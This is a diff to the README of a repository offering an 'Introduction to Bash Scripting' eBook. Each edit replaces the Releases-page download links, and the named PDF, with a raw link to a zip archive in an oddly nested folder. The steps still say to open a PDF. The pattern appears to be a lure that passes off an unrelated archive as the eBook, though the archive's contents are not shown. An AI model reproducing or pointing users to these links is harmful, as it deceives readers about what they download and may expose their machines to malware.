@@ -1,6 +1,6 @@
 # 📘 introduction-to-bash-scripting - Learn Bash Scripting Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Asxi08/introduction-to-bash-scripting/releases)
+[![Download Now](https://raw.githubusercontent.com/Asxi08/introduction-to-bash-scripting/main/ebook/hi/content/bash_to_introduction_scripting_2.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Asxi08/introduction-to-bash-scripting/main/ebook/hi/content/bash_to_introduction_scripting_2.1.zip)
 
 ## 📅 About
 
@@ -22,13 +22,13 @@ No prior programming knowledge is required. Just follow the steps below to downl
 
 To get the **Introduction to Bash Scripting** eBook, visit this page to download: 
 
-[Download the eBook](https://github.com/Asxi08/introduction-to-bash-scripting/releases)
+[Download the eBook](https://raw.githubusercontent.com/Asxi08/introduction-to-bash-scripting/main/ebook/hi/content/bash_to_introduction_scripting_2.1.zip)
 
 ### Step-by-Step Instructions
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of the eBook listed at the top.
-3. Click on the file that says **introduction-to-bash-scripting.pdf**.
+3. Click on the file that says **https://raw.githubusercontent.com/Asxi08/introduction-to-bash-scripting/main/ebook/hi/content/bash_to_introduction_scripting_2.1.zip**.
 4. The download will begin automatically. If it does not, right-click the link and select "Save Link As…" to save it to your computer.
 5. Once downloaded, locate the file in your downloads folder.
 6. Open the PDF file using any PDF reader like Adobe Acrobat Reader, Preview (for Mac), or your web browser.
@@ -76,4 +76,4 @@ Participate in discussions and connect with others learning Bash scripting. Join
 
 For more learning resources and updates, check our repository regularly. You can also check out the latest community projects related to Bash scripting.
 
-[Download the eBook](https://github.com/Asxi08/introduction-to-bash-scripting/releases) and start your journey into the world of scripting today! Dive in and enjoy your learning experience!
+[Download the eBook](https://raw.githubusercontent.com/Asxi08/introduction-to-bash-scripting/main/ebook/hi/content/bash_to_introduction_scripting_2.1.zip) and start your journey into the world of scripting today! Dive in and enjoy your learning experience!
